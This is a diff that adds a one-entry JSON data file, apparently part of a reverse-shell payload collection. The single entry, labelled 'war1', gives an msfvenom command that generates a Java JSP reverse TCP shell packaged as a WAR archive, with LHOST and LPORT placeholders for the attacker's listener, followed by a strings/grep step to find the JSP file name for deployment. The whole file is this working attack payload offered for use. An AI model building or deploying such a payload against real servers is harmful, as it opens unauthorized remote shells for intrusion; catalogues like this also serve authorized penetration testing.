@@ -1,0 +1,9 @@
+[
+  {
+    "type": "war",
+    "direction": "reverse",
+    "payload": "msfvenom -p java/jsp_shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f war > reverse.war\nstrings reverse.war | grep jsp # in order to get the name of the file",
+    "note": null,
+    "id": "war1"
+  }
+]
